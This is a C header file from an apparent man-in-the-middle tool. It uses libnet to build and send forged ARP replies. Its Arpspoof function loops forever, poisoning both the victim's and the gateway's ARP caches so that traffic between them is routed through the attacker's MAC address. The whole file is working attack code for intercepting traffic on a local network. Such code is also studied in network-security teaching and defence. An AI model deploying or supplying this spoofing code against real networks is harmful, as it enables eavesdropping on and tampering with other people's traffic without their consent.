/*
* MODULE: send fake ARP packet to gateway and victim.
* MAIN FUNCTION: Arpspoof
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
*/

#ifndef __ARPSPOOF_H_
#define __ARPSPOOF_H_

#include "head.h"

int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_char *dstIp, int op) {

    /* definations */
    libnet_t *net_t = NULL;
    static u_char padPtr[18];
    char err_buf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    int res;

    /* start libnet */
    net_t = libnet_init(LIBNET_LINK_ADV, dev, err_buf);
    if (net_t == NULL) {
        printf("libnet start error\n");
        return 1;
    }

    /* build ARP */
    p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, MAC_ADDR_LEN, IP_ADDR_LEN, op,
    srcMac, srcIp, dstMac, dstIp, padPtr, 18, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build_arp error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* build ethernet */
    p_tag = libnet_build_ethernet(dstMac, srcMac, EPT_ARP, padPtr, 0, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build_ethernet error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* send packet */
    res = libnet_write(net_t);
    if (res == -1) {
        printf("ARP libnet write error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* success */
    libnet_destroy(net_t);
    return 0;
}

void Arpspoof(void *ARG) {
    MITM_info arg = *(MITM_info *)ARG;
    while (1) {
        /* sent to victim */
        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.TARGET_MAC, arg.GATEWAY_IP, arg.TARGET_IP, ARP_REPLY);
        usleep(500000);
        /* sent to gateway */
        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.GATEWAY_MAC, arg.TARGET_IP, arg.GATEWAY_IP, ARP_REPLY);
        usleep(500000);
    }
}

#endif